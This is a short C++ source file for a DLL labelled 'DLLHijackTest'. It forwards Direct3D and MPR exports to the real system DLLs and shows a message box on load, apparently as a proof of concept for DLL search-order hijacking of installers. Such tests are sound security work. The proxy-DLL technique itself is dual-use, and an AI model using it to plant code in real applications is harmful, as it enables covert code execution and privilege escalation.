// dllmain.cpp : Defines the entry point for the DLL application.
#include <windows.h>

#define export(X) comment(linker, "/export:" X)

#pragma export("Direct3DCreate9=C:\\windows\\system32\\d3d9.Direct3DCreate9")
#pragma export("WNetGetUniversalNameA=C:\\windows\\system32\\MPR.WNetGetUniversalNameA")
#pragma export("WNetGetUniversalNameW=C:\\windows\\system32\\MPR.WNetGetUniversalNameW")

extern "C" BOOL WINAPI _DllMainCRTStartup(HMODULE hModule, DWORD ul_reason_for_call, LPVOID)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        static WCHAR const szWho[] = L"DLLHijackTest";
        int ret = MessageBoxW(NULL,
            L"Shit happens. Do you want to know the details?", szWho, MB_YESNOCANCEL);
        // Loader lock issues can happen, but installers can also silently kill threads.
        // Therefore, go without a dedicated thread for the UACSelfElevation dialog.
        return ret != IDYES ? ret == IDNO :
            wWinMain(hModule, NULL, const_cast<LPWSTR>(szWho), SW_SHOWNORMAL) != IDABORT;
    }
    return TRUE;
}
